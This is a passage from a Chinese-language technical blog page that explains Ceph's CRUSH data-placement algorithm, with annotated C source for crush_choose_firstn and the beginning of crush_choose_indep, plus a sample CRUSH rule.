class="hljs-string">emit</span><br>&#125;<br></code></pre></td></tr></table></figure><p><strong>选择 item 的伪代码总结:</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><br></code></pre></td></tr></table></figure><p><strong>选择 item 的详细代码解析:</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * crush_choose_firstn - 选择给定类型的 numrep 个不同项目</span><br><span class="hljs-comment"> * @map: 对应 crush map</span><br><span class="hljs-comment"> * @work:</span><br><span class="hljs-comment"> * @bucket: item 所归属的 bucket</span><br><span class="hljs-comment"> * @weight:</span><br><span class="hljs-comment"> * @weight_max:</span><br><span class="hljs-comment"> * @x: 输入哈希值，对应为 pgp seed</span><br><span class="hljs-comment"> * @numrep: crush rule 中单个 step 定义的要选择的 item 数量</span><br><span class="hljs-comment"> * @type: crush rule 中单个 step 定义的要选择的 item 类型</span><br><span class="hljs-comment"> * @out: 选中的 item 的数组</span><br><span class="hljs-comment"> * @outpos: 选中的 item 要存储在 out 数组中的索引</span><br><span class="hljs-comment"> * @out_size: 待选择的 item 的数量，计算规则为 pool 的副本数量减去已选择的 item 的数量</span><br><span class="hljs-comment"> * @tries: 默认为 choose_total_tries + 1 ， 默认为 51</span><br><span class="hljs-comment"> * @recurse_tries: 递归 chooseleaf 尝试的次数</span><br><span class="hljs-comment"> * @local_retries: 对应 choose_local_tries 配置，默认为 50</span><br><span class="hljs-comment"> * @local_fallback_retries: 对应 choose_local_fallback_tries 配置，默认为 0</span><br><span class="hljs-comment"> * @recurse_to_leaf: 是否递归到叶子节点</span><br><span class="hljs-comment"> * @vary_r: 对应 chooseleaf_vary_r 配置，默认为 1</span><br><span class="hljs-comment"> * @stable: 对应 chooseleaf_stable 配置，默认为 1</span><br><span class="hljs-comment"> * @out2: 第二个输出向量用于叶 item （如果 @recurse_to_leaf）</span><br><span class="hljs-comment"> * @parent_r: 从父级传递的 r 值</span><br><span class="hljs-comment"> * @choose_args:</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">crush_choose_firstn</span><span class="hljs-params">(</span><br><span class="hljs-params">    <span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> crush_map* <span class="hljs-built_in">map</span>, <span class="hljs-keyword">struct</span> crush_work* work, <span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> crush_bucket* bucket,</span><br><span class="hljs-params">    <span class="hljs-type">const</span> __u32* weight, <span class="hljs-type">int</span> weight_max, <span class="hljs-type">int</span> x, <span class="hljs-type">int</span> numrep, <span class="hljs-type">int</span> type, <span class="hljs-type">int</span>* out, <span class="hljs-type">int</span> outpos,</span><br><span class="hljs-params">    <span class="hljs-type">int</span> out_size, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> tries, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> recurse_tries, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> local_retries,</span><br><span class="hljs-params">    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> local_fallback_retries, <span class="hljs-type">int</span> recurse_to_leaf, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> vary_r,</span><br><span class="hljs-params">    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> stable, <span class="hljs-type">int</span>* out2, <span class="hljs-type">int</span> parent_r, <span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> crush_choose_arg* choose_args)</span><br>&#123;<br>    <span class="hljs-comment">// rep 代表 replication ，对应副本 id</span><br>    <span class="hljs-type">int</span> rep;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> ftotal, flocal;<br>    <span class="hljs-type">int</span> retry_descent, retry_bucket, skip_rep;<br>    <span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">crush_bucket</span>* <span class="hljs-title">in</span> =</span> bucket;<br>    <span class="hljs-type">int</span> r;<br>    <span class="hljs-type">int</span> i;<br>    <span class="hljs-type">int</span> item = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">int</span> itemtype;<br>    <span class="hljs-type">int</span> collide, reject;<br>    <span class="hljs-type">int</span> count = out_size;<br><br>    <span class="hljs-comment">// ...</span><br><br>    <span class="hljs-comment">// 循环遍历选择 item</span><br>    <span class="hljs-comment">//</span><br>    <span class="hljs-comment">// stable 默认为 1 , 因此 rep 范围为 [0, numrep) , 含义为逐步获取 numrep 个副本 item</span><br>    <span class="hljs-comment">// count 为待选择的 item 数量，范围为 pool 的副本数量减去已选择的 item 的数量</span><br>    <span class="hljs-keyword">for</span> (rep = stable ? <span class="hljs-number">0</span> : outpos; rep &lt; numrep &amp;&amp; count &gt; <span class="hljs-number">0</span>; rep++) &#123;<br>        <span class="hljs-comment">// 总失败次数</span><br>        ftotal = <span class="hljs-number">0</span>;<br><br>        <span class="hljs-comment">// 是否跳过当前副本</span><br>        skip_rep = <span class="hljs-number">0</span>;<br><br>        <span class="hljs-keyword">do</span> &#123;<br>            <span class="hljs-comment">// retry_descent 是一个标志变量，用于控制是否需要重新尝试选择过程，但这次是在更深层次的桶结构中。</span><br>            <span class="hljs-comment">// &quot;descent&quot; 在这里指的是在 CRUSH 桶的层次结构中向下进行，即从当前桶向下到其子桶中进行选择。</span><br>            retry_descent = <span class="hljs-number">0</span>;<br><br>            <span class="hljs-comment">// 记录当前 bucket</span><br>            in = bucket;<br><br>            <span class="hljs-comment">// 重置当前 bucket 中的失败次数</span><br>            flocal = <span class="hljs-number">0</span>;<br><br>            <span class="hljs-keyword">do</span> &#123;<br>                <span class="hljs-comment">// 是否发生了碰撞，即选择了重复的 item</span><br>                collide = <span class="hljs-number">0</span>;<br><br>                <span class="hljs-comment">// 是否在当前 bucket 中重试</span><br>                retry_bucket = <span class="hljs-number">0</span>;<br><br>                <span class="hljs-comment">// rep 是当前的副本编号，表示正在尝试选择第几个副本。在 CRUSH</span><br>                <span class="hljs-comment">// 算法中，每个数据副本都应该尽可能分布在不同的设备上，以提高数据的耐用性和可用性。 parent_r</span><br>                <span class="hljs-comment">// 是从父调用（如果有的话）传递下来的一个值，它可能代表了上一层级选择过程中的某些状态或者迭代次数。</span><br>                <span class="hljs-comment">// 这个值的传递有助于保持选择的连贯性和上下文相关性，特别是在递归调用中。</span><br>                <span class="hljs-comment">// 第一次调用 crush_choose_firstn 的时候，传入的 parent_r 为 0</span><br>                r = rep + parent_r;<br><br>                <span class="hljs-comment">// ftotal</span><br>                <span class="hljs-comment">// 是到目前为止总的失败次数，即在当前选择过程中已经尝试并失败的次数。这包括因为冲突、类型不匹配或其他原因导致的选择失败。</span><br>                <span class="hljs-comment">// 通过将 ftotal 加到 r 上，CRUSH</span><br>                <span class="hljs-comment">// 算法在每次失败后修改选择的种子，这有助于在下一次尝试中改变选择的结果，从而尝试避免之前导致失败的情况。</span><br>                <span class="hljs-comment">// 这是一种常见的技术，用于在保持随机性的同时解决潜在的重复冲突或选择死锁。</span><br>                r += ftotal;<br><br>                <span class="hljs-comment">//当前 bucket 中 item 数量为 0 ，则停止在当前 bucket 中寻找 item</span><br>                <span class="hljs-keyword">if</span> (in-&gt;size == <span class="hljs-number">0</span>) &#123;<br>                    reject = <span class="hljs-number">1</span>;<br>                    <span class="hljs-keyword">goto</span> reject;<br>                &#125;<br><br>                <span class="hljs-comment">// local_fallback_retries 表示本地回退重试的次数，默认为 0 。 </span><br>                <span class="hljs-comment">//</span><br>                <span class="hljs-comment">// flocal &gt;= (in-&gt;size &gt;&gt; 1): flocal</span><br>                <span class="hljs-comment">// 是本地失败的次数，这个条件检查是否失败次数已经达到或超过了桶大小的一半。 flocal &gt;</span><br>                <span class="hljs-comment">// local_fallback_retries: 检查本地失败次数是否超过了设定的本地回退重试次数。</span><br>                <span class="hljs-keyword">if</span> (local_fallback_retries &gt; <span class="hljs-number">0</span> &amp;&amp; flocal &gt;= (in-&gt;size &gt;&gt; <span class="hljs-number">1</span>) &amp;&amp; flocal &gt; local_fallback_retries)<br>                    <span class="hljs-comment">// 如果上述条件全部满足，说明常规的选择方法可能不适用，需要使用一种备用的选择方法。</span><br>                    <span class="hljs-comment">// 这是备用的选择方法，用于在常规方法失败后尝试另一种可能的选择方式。这个函数可能是基于某种特定的置换或者排列算法来选择设备。</span><br>                    item = bucket_perm_choose(in, work-&gt;work[<span class="hljs-number">-1</span> - in-&gt;id], x, r);<br>                <span class="hljs-keyword">else</span><br>                    <span class="hljs-comment">// 从指定 bucket 中选择 item</span><br>                    <span class="hljs-comment">// in 为 bucket</span><br>                    <span class="hljs-comment">// x 为输入哈希值，对应为 pgp seed</span><br>                    <span class="hljs-comment">// choose_args 为 straw2 算法需要使用的参数</span><br>                    <span class="hljs-comment">// outpos 为待选择出的 item 在 out 数组中的索引</span><br>                    item = crush_bucket_choose(<br>                        in, work-&gt;work[<span class="hljs-number">-1</span> - in-&gt;id], x, r, (choose_args ? &amp;choose_args[<span class="hljs-number">-1</span> - in-&gt;id] : <span class="hljs-number">0</span>), outpos);<br><br>                <span class="hljs-comment">// 选择的 item 的 id 大小异常，则结束当前 rep 的 for 循环，将 rep++ 之后，进入下一个选择逻辑</span><br>                <span class="hljs-keyword">if</span> (item &gt;= <span class="hljs-built_in">map</span>-&gt;max_devices) &#123;<br>                    dprintk(<span class="hljs-string">&quot;   bad item %d\n&quot;</span>, item);<br>                    skip_rep = <span class="hljs-number">1</span>;<br>                    <span class="hljs-keyword">break</span>;<br>                &#125;<br><br>                <span class="hljs-comment">// item 的 id 小于 0 ，代表这是一个 bucket ， 则获取对应 bucket 的类型信息，</span><br>                <span class="hljs-comment">// 否则当前 item 是 osd 类型 ，因此其 type 类型值为 0 。</span><br>                <span class="hljs-keyword">if</span> (item &lt; <span class="hljs-number">0</span>)<br>                    itemtype = <span class="hljs-built_in">map</span>-&gt;buckets[<span class="hljs-number">-1</span> - item]-&gt;type;<br>                <span class="hljs-keyword">else</span><br>                    itemtype = <span class="hljs-number">0</span>;<br>                dprintk(<span class="hljs-string">&quot;  item %d type %d\n&quot;</span>, item, itemtype);<br><br>                <span class="hljs-comment">// 当前 item 的类型与期望的类型不同</span><br>                <span class="hljs-keyword">if</span> (itemtype != type) &#123;<br>                    <span class="hljs-comment">// item &gt;= 0 时，意味着当前 item 是一个叶子节点，此时类型仍然不匹配，基于 rep</span><br>                    <span class="hljs-comment">// 的选择已经没有意义，尝试进入下一个 rep++ 的选择逻辑。</span><br>                    <span class="hljs-comment">// item 为负数时，并且对应 bucket 的类型超限，则非法，结束基于当前 rep 的选择逻辑，尝试进入下一个</span><br>                    <span class="hljs-comment">// rep++ 的选择逻辑。</span><br>                    <span class="hljs-keyword">if</span> (item &gt;= <span class="hljs-number">0</span> || (<span class="hljs-number">-1</span> - item) &gt;= <span class="hljs-built_in">map</span>-&gt;max_buckets) &#123;<br>                        dprintk(<span class="hljs-string">&quot;   bad item type %d\n&quot;</span>, type);<br>                        skip_rep = <span class="hljs-number">1</span>;<br>                        <span class="hljs-keyword">break</span>;<br>                    &#125;<br><br>                    <span class="hljs-comment">// 当前 item 不是叶子节点，则会从当前 item 对应的 bucket 中继续寻找 item</span><br>                    <span class="hljs-comment">// 有点类似于深度遍历的逻辑。</span><br>                    in = <span class="hljs-built_in">map</span>-&gt;buckets[<span class="hljs-number">-1</span> - item];<br>                    retry_bucket = <span class="hljs-number">1</span>;<br>                    <span class="hljs-keyword">continue</span>;<br>                &#125;<br><br>                <span class="hljs-comment">// 走到这里意味着找到了类型匹配的 item ，但是我们需要监测该 item 是否之前已经被选择过。</span><br>                <span class="hljs-comment">// 如果之前被选择过了，意味着发生了冲突。</span><br>                <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; outpos; i++) &#123;<br>                    <span class="hljs-keyword">if</span> (out[i] == item) &#123;<br>                        collide = <span class="hljs-number">1</span>;<br>                        <span class="hljs-keyword">break</span>;<br>                    &#125;<br>                &#125;<br><br>                <span class="hljs-comment">// 没有碰撞冲突，且需要递归到叶子节点</span><br>                <span class="hljs-comment">// 如果没有发生冲突，并且需要递归到叶子节点</span><br>                reject = <span class="hljs-number">0</span>;<br>                <span class="hljs-keyword">if</span> (!collide &amp;&amp; recurse_to_leaf) &#123;<br>                    <span class="hljs-comment">// 如果当前 item 不是叶子节点</span><br>                    <span class="hljs-keyword">if</span> (item &lt; <span class="hljs-number">0</span>) &#123;<br>                        <span class="hljs-type">int</span> sub_r;<br>                        <span class="hljs-comment">// vary_r 对应 chooseleaf_vary_r 配置，默认为 1</span><br>                        <span class="hljs-keyword">if</span> (vary_r) &#123;<br>                            <span class="hljs-comment">// 当 vary_r 为 1 时， sub_r = r</span><br>                            sub_r = r &gt;&gt; (vary_r - <span class="hljs-number">1</span>);<br>                        &#125;<br>                        <span class="hljs-keyword">else</span> &#123;<br>                            sub_r = <span class="hljs-number">0</span>;<br>                        &#125;<br><br>                        <span class="hljs-comment">// 返回的值小于等于 outpos ，意味着在内部调用的时候没有找到符合条件的 item</span><br>                        <span class="hljs-keyword">if</span> (crush_choose_firstn(<br>                                <span class="hljs-built_in">map</span>,                       <span class="hljs-comment">// 对应 crush map</span><br>                                work,                      <span class="hljs-comment">// </span><br>                                <span class="hljs-built_in">map</span>-&gt;buckets[<span class="hljs-number">-1</span> - item],   <span class="hljs-comment">// 当前 item 的 bucket</span><br>                                weight,                    <span class="hljs-comment">// </span><br>                                weight_max,                <span class="hljs-comment">// </span><br>                                x,                         <span class="hljs-comment">// 输入哈希值，对应为 pgp seed</span><br>                                stable ? <span class="hljs-number">1</span> : outpos + <span class="hljs-number">1</span>,   <span class="hljs-comment">// stable 对应 chooseleaf_stable 配置，默认为 1</span><br>                                <span class="hljs-number">0</span>,               <span class="hljs-comment">// 期望的 item 类型，0 代表着叶子节点 osd 的类型</span><br>                                out2,            <span class="hljs-comment">// 将获取的叶子节点的 item 存入 out2 数组</span><br>                                outpos,          <span class="hljs-comment">// 期望选中的 item 在 out 数组中的索引位置</span><br>                                count,           <span class="hljs-comment">// </span><br>                                recurse_tries,   <span class="hljs-comment">// </span><br>                                <span class="hljs-number">0</span>,               <span class="hljs-comment">// </span><br>                                local_retries,   <span class="hljs-comment">// 对应 choose_local_tries 配置，默认为 50</span><br>                                local_fallback_retries,   <span class="hljs-comment">// 对应 choose_local_fallback_tries 配置，默认为 0</span><br>                                <span class="hljs-number">0</span>,                        <span class="hljs-comment">// 是否递归到叶子节点</span><br>                                vary_r,                   <span class="hljs-comment">// vary_r 对应 chooseleaf_vary_r 配置，默认为 1</span><br>                                stable,                   <span class="hljs-comment">// stable 对应 chooseleaf_stable 配置，默认为 1</span><br>                                <span class="hljs-literal">NULL</span>,         <span class="hljs-comment">// 设置传入的 out2 数组为 NULL ，因为不会使用该变量</span><br>                                sub_r,        <span class="hljs-comment">// 按照默认值的情况， sub_r = r</span><br>                                choose_args   <span class="hljs-comment">// choose_args 为 straw2 算法需要使用的参数</span><br>                                ) &lt;= outpos) &#123;<br>                            <span class="hljs-comment">// 经过深度遍历的调用后，仍然没有找到新的 item ，则拒绝</span><br>                            reject = <span class="hljs-number">1</span>;<br>                        &#125;<br>                    &#125;<br>                    <span class="hljs-keyword">else</span> &#123;<br>                        <span class="hljs-comment">// 当前 item 已经是一个叶子节点了，则将该 item 记录到 out2 数组中</span><br>                        out2[outpos] = item;<br>                    &#125;<br>                &#125;<br><br>                <span class="hljs-comment">// 如果没有被拒绝，并且，也没有发生冲突</span><br>                <span class="hljs-keyword">if</span> (!reject &amp;&amp; !collide) &#123;<br>                    <span class="hljs-comment">// itemtype 为 0 意味着选择的 item 是一个 osd</span><br>                    <span class="hljs-keyword">if</span> (itemtype == <span class="hljs-number">0</span>) reject = is_out(<span class="hljs-built_in">map</span>, weight, weight_max, item, x);<br>                &#125;<br><br>            reject:<br>                <span class="hljs-comment">// 处理被拒绝或者发生了碰撞冲突的情况</span><br>                <span class="hljs-comment">//</span><br>                <span class="hljs-comment">// reject 对应的场景如下:</span><br>                <span class="hljs-comment">// 1. 当前的 bucket 中 item 数量为 0 ，则拒绝在当前 bucket 中选择；</span><br>                <span class="hljs-comment">// 2. 在选择叶子节点的过程中，如果没有找到符合条件的 item ，则拒绝在当前 bucket 中选择；</span><br>                <span class="hljs-comment">//</span><br>                <span class="hljs-comment">// collide 对应的场景如下:</span><br>                <span class="hljs-comment">// 1. 当前选择的 item 与之前选择过的 item 一致，即发生了碰撞冲突；</span><br>                <span class="hljs-keyword">if</span> (reject || collide) &#123;<br>                    <span class="hljs-comment">// 调整失败数量</span><br>                    ftotal++;<br>                    flocal++;<br><br>                    <span class="hljs-comment">// 发生了碰撞冲突，但是在当前 bucket 中重试的次数没有超过限制，则可以再次重试。</span><br>                    <span class="hljs-comment">// local_retries 对应 choose_local_tries 配置，默认为 50 。</span><br>                    <span class="hljs-keyword">if</span> (collide &amp;&amp; flocal &lt;= local_retries) retry_bucket = <span class="hljs-number">1</span>;<br><br>                    <span class="hljs-comment">// local_fallback_retries 对应 choose_local_fallback_tries 配置，默认为 0</span><br>                    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (local_fallback_retries &gt; <span class="hljs-number">0</span> &amp;&amp; flocal &lt;= in-&gt;size + local_fallback_retries)<br>                        retry_bucket = <span class="hljs-number">1</span>;<br><br>                    <span class="hljs-comment">// 如果总失败次数小于 tries ， 则尝试向下寻找</span><br>                    <span class="hljs-comment">// tries 默认为 choose_total_tries + 1 ， 即默认为 51</span><br>                    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (ftotal &lt; tries)<br>                        retry_descent = <span class="hljs-number">1</span>;<br><br>                    <span class="hljs-keyword">else</span><br>                        <span class="hljs-comment">// 放弃当前 rep 的选择</span><br>                        skip_rep = <span class="hljs-number">1</span>;<br><br>                    dprintk(<span class="hljs-string">&quot;  reject %d  collide %d  ftotal %u  flocal %u\n&quot;</span>, reject, collide, ftotal, flocal);<br>                &#125;<br>                <span class="hljs-comment">// 在当前 bucket 中重新选择。</span><br>                <span class="hljs-comment">//</span><br>                <span class="hljs-comment">// 对应的场景如下:</span><br>                <span class="hljs-comment">// 1. 当前选择的 item 的类型不是期望的类型，但其仍是一个 bucket ，可从该 bucket 中继续检索；</span><br>                <span class="hljs-comment">// 2. 如果选择的 item 之前已经选择过，即发生了碰撞冲突，但本地失败的次数仍然在 local_retries</span><br>                <span class="hljs-comment">//    范围内，则可以继续在当前 bucket 中重新选择；</span><br>                <span class="hljs-comment">// 3. 如果启用了本地回退重试，且本地失败的次数满足条件，则可以继续在当前 bucket 中重新选择；</span><br>            &#125; <span class="hljs-keyword">while</span> (retry_bucket);<br><br>            <span class="hljs-comment">// 下降重试。</span><br>            <span class="hljs-comment">//</span><br>            <span class="hljs-comment">// 对应的场景如下:</span><br>            <span class="hljs-comment">// 1. 如果总的失败次数小于 tries ， 则可以继续下降重试</span><br>        &#125; <span class="hljs-keyword">while</span> (retry_descent);<br><br>        <span class="hljs-comment">// 经过上述判断，结论是需要跳过当前 rep 的选择。</span><br>        <span class="hljs-comment">//</span><br>        <span class="hljs-comment">// 对应的场景如下:</span><br>        <span class="hljs-comment">// 1. 选择的 item 异常。item 的 id 超过 max_devices 值。</span><br>        <span class="hljs-comment">// 2. 选择的 item 类型不匹配。找到的叶子节点与期望的 item type 不匹配；找到的 item id 超过了 max_buckets值；</span><br>        <span class="hljs-comment">// 3. 异常选择的次数不满足约束。选择过程被拒绝或者发生了碰撞冲突，且失败的次数不满足约束。</span><br>        <span class="hljs-keyword">if</span> (skip_rep) &#123;<br>            dprintk(<span class="hljs-string">&quot;skip rep\n&quot;</span>);<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br><br>        <span class="hljs-comment">// 选择到符合条件的 item ，将其加入 out 数组</span><br>        dprintk(<span class="hljs-string">&quot;CHOOSE got %d\n&quot;</span>, item);<br>        out[outpos] = item;<br>        outpos++;<br>        count--;<br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> __KERNEL__</span><br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">map</span>-&gt;choose_tries &amp;&amp; ftotal &lt;= <span class="hljs-built_in">map</span>-&gt;choose_total_tries) <span class="hljs-built_in">map</span>-&gt;choose_tries[ftotal]++;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>    &#125;<br><br>    <span class="hljs-comment">// 返回 out 数组中已选中 item 的数量</span><br>    dprintk(<span class="hljs-string">&quot;CHOOSE returns %d\n&quot;</span>, outpos);<br>    <span class="hljs-keyword">return</span> outpos;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="2-2-4、Choose-Indep-逻辑"><a href="#2-2-4、Choose-Indep-逻辑" class="headerlink" title="2.2.4、Choose Indep 逻辑"></a>2.2.4、Choose Indep 逻辑</h3><p><strong>示例 rule:</strong></p><figure class="highlight yaml"><table><tr><td class="code"><pre><code class="hljs yaml"><span class="hljs-comment"># rules</span><br><span class="hljs-string">rule</span> <span class="hljs-string">replicated_rule</span> &#123;<br>        <span class="hljs-string">id</span> <span class="hljs-number">0</span><br>        <span class="hljs-string">type</span> <span class="hljs-string">replicated</span><br>        <span class="hljs-string">step</span> <span class="hljs-string">take</span> <span class="hljs-string">default</span><br>        <span class="hljs-string">step</span> <span class="hljs-string">chooseleaf</span> <span class="hljs-string">indep</span> <span class="hljs-number">0</span> <span class="hljs-string">type</span> <span class="hljs-string">host</span><br>        <span class="hljs-string">step</span> <span class="hljs-string">emit</span><br>&#125;<br></code></pre></td></tr></table></figure><p><strong>选择 item 的伪代码总结:</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><br></code></pre></td></tr></table></figure><p><strong>选择 item 的详细代码解析:</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * crush_choose_indep - 选择给定类型的 numrep 个不同项目</span><br><span class="hljs-comment"> * @map: 对应 crush map</span><br><span class="hljs-comment"> * @work:</span><br><span class="hljs-comment"> * @bucket: item 所归属的 bucket</span><br><span class="hljs-comment"> * @weight:</span><br><span class="hljs-comment"> * @weight_max:</span><br><span class="hljs-comment"> * @x: 输入哈希值，对应为 pgp seed</span><br><span class="hljs-comment"> * @left: 在当前 bucket 中还需要选择的 item 的数量</span><br><span class="hljs-comment"> * @numrep: crush rule 中单个 step 定义的要选择的 item 数量</span><br><span class="hljs-comment"> * @type: crush rule 中单个 step 定义的要选择的 item 类型</span><br><span class="hljs-comment"> * @out: 选中的 item 的数组</span><br><span class="hljs-comment"> * @outpos: 选中的 item 要存储在 out 数组中的索引</span><br><span class="hljs-comment"> * @tries: 默认为 choose_total_tries + 1 ， 默认为 51</span><br><span class="hljs-comment"> * @recurse_tries: 由于 choose_leaf_tries 默认为 0 ，所以该值默认为 1</span><br><span class="hljs-comment"> * @recurse_to_leaf: 是否递归到叶子节点</span><br><span class="hljs-comment"> * @out2: 第二个输出向量用于叶 item （如果 @recurse_to_leaf）</span><br><span class="hljs-comment"> * @parent_r: 从父级传递的 r 值</span><br><span class="hljs-comment"> * @choose_args: choose_args 为 straw2 算法用到的参数</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">crush_choose_indep</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> crush_map* <span class="hljs-built_in">map</span>, <span class="hljs-keyword">struct</span> crush_work* work,                            <span class="hljs-comment">// 2</span></span><br><span class="hljs-params">                               <span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> crush_bucket* bucket, <span class="hljs-type">const</span> __u32* weight, <span class="hljs-type">int</span> weight_max, <span class="hljs-type">int</span> x,   <span class="hljs-comment">// 6</span></span><br><span class="hljs-params">                               <span class="hljs-type">int</span> left, <span class="hljs-type">int</span> numrep, <span class="hljs-type">int</span> type, <span class="hljs-type">int</span>* out, <span class="hljs-type">int</span> outpos, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> tries,        <span class="hljs-comment">// 12</span></span><br><span class="hljs-params">                               <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> recurse_tries, <span class="hljs-type">int</span> recurse_to_leaf, <span class="hljs-type">int</span>* out2, <span class="hljs-type">int</span> parent_r,        <span class="hljs-comment">// 16</span></span><br><span class="hljs-params">                               <span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> crush_choose_arg* choose_args)</span>                                      <span class="hljs-comment">// 17</span><br>&#123;<br>    <span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">crush_bucket</span>* <span class="hljs-title">in</span> =</span> bucket;<br>    <span class="hljs-type">int</span> endpos = outpos + left;<br>    <span class="hljs-type">int</span> rep;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> ftotal;<br>    <span class="hljs-type">int</span> r;<br>    <span class="hljs-type">int</span> i;<br>    <span class="hljs-type">int</span> item = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">int</span> itemtype;<br>    <span class="hljs-type">int</span> collide;<br><br>    <span class="hljs-comment">// ...</span><br><br>    <span class="hljs-comment">// 初始化剩余所有要获取的 item 的元素在数组中的索引位置</span><br>    <span class="hljs-keyword">for</span> (rep = outpos; rep &lt; endpos; rep++) &#123;<br>        out[rep] = CRUSH_ITEM_UNDEF;<br>        <span class="hljs-keyword">if</span> (out2) out2[rep] = CRUSH_ITEM_UNDEF;<br>    &#125;<br><br>    <span class="hljs-comment">// 限制总的失败次数，并且监测在当前 bucket 中待选择的 item 数量</span><br>    <span class="hljs-keyword">for</span> (ftotal = <span class="hljs-number">0</span>; left &gt; <span class="hljs-number">0</span> &amp;&amp; ftotal &lt; tries; ftotal++) &#123;<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> DEBUG_INDEP</span><br>        <span class="hljs-keyword">if</span> (out2 &amp;&amp; ftotal) &#123;<br>            dprintk(<span class="hljs-string">&quot;%u %d a: &quot;</span>, ftotal, left);<br>            <span class="hljs-keyword">for</span> (rep = outpos; rep &lt; endpos; rep++) &#123; dprintk(<span class="hljs-string">&quot; %d&quot;</span>, out[rep]); &#125;<br>            dprintk(<span class="hljs-string">&quot;\n&quot;</span>);<br>            dprintk(<span class="hljs-string">&quot;%u %d b: &quot;</span>, ftotal, left);<br>            <span class="hljs-keyword">for</span> (rep = outpos; rep &lt; endpos; rep++) &#123; dprintk(<span class="hljs-string">&quot; %d&quot;</span>, out2[rep]); &#125;<br>            dprintk(<span class="hljs-string">&quot;\n&quot;</span>);<br>        &#125;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>        <span class="hljs-comment">// 不断循环监测 out 数组中哪个位置上仍没有选取的 item ，则开始执行选取操作</span><br>        <span class="hljs-keyword">for</span> (rep = outpos; rep &lt; endpos; rep++) &#123;<br>            <span class="hljs-keyword">if</span> (out[rep] != CRUSH_ITEM_UNDEF) <span class="hljs-keyword">continue</span>;<br><br>            <span class="hljs-comment">// 标记当前 bucket</span><br>            in = bucket;<br><br>            <span class="hljs-comment">// 不断循环检索</span><br>            <span class="hljs-comment">//</span><br>            <span class="hljs-comment">// 结束循环的条件:</span><br>            <span class="hljs-comment">// 1. bucket 中 item 数量为空</span><br>            <span class="hljs-comment">// 2. 选择的 item 类型为 osd ，但其 id 超过 max_devices ，则异常</span><br>            <span class="hljs-comment">// 3. 选择的 item 为 bucekt ，但是其 id 大于 max_buckets ，则异常</span><br>            <span class="hljs-comment">// 4. 选择 item 发生了冲突，即找到了重复的 item</span><br>            <span class="hljs-comment">// 5. 在需要递归检索叶子节点的时候，找不到对应的叶子节点</span><br>            <span class="hljs-comment">// 6. itemtype == 0 &amp;&amp; is_out(map, weight, weight_max, item, x) 的情况</span><br>            <span class="hljs-comment">// 7. 找到符合条件的 item</span><br>            <span class="hljs-keyword">for</span> (;;) &#123;<br>                <span class="hljs-comment">// 更新 r 值</span><br>                r = rep + parent_r;<br><br>                <span class="hljs-comment">// 如果 bucket 算法为 CRUSH_BUCKET_UNIFORM 则执行特殊处理</span><br>                <span class="hljs-keyword">if</span> (in-&gt;alg == CRUSH_BUCKET_UNIFORM &amp;&amp; in-&gt;size % numrep == <span class="hljs-number">0</span>)<br>                    r += (numrep + <span class="hljs-number">1</span>) * ftotal;<br>                <span class="hljs-keyword">else</span><br>                    <span class="hljs-comment">// 更新 r 值，这是关键点，防止每次 r 值不变，找到的都是相同的 item</span><br>                    r += numrep * ftotal;<br><br>                <span class="hljs-comment">// bucket 中元素为空，则跳过当前 bucket</span><br>                <span class="hljs-keyword">if</span> (in-&gt;size == <span class="hljs-number">0</span>) &#123;<br>                    dprintk(<span class="hljs-string">&quot;   empty bucket\n&quot;</span>);<br>                    <span class="hljs-keyword">break</span>;<br>                &#125;<br><br>                <span class="hljs-comment">// 根据 bucket 内配置的算法不同，执行不同的选取 item 操作</span><br>                item = crush_bucket_choose(<br>                    in, work-&gt;work[<span class="hljs-number">-1</span> - in-&gt;id], x, r, (choose_args ? &amp;choose_args[<span class="hljs-number">-1</span> - in-&gt;id] : <span class="hljs-number">0</span>), outpos);<br><br>                <span class="hljs-comment">// item 的索引大于最大的 device 则为异常，将对应的副本序号的数设置为 CRUSH_ITEM_NONE</span><br>                <span class="hljs-keyword">if</span> (item &gt;= <span class="hljs-built_in">map</span>-&gt;max_devices) &#123;<br>                    dprintk(<span class="hljs-string">&quot;   bad item %d\n&quot;</span>, item);<br>                    out[rep] = CRUSH_ITEM_NONE;<br>                    <span class="hljs-keyword">if</span> (out2) out2[rep] = CRUSH_ITEM_NONE;<br>                    left--;<br>                    <span 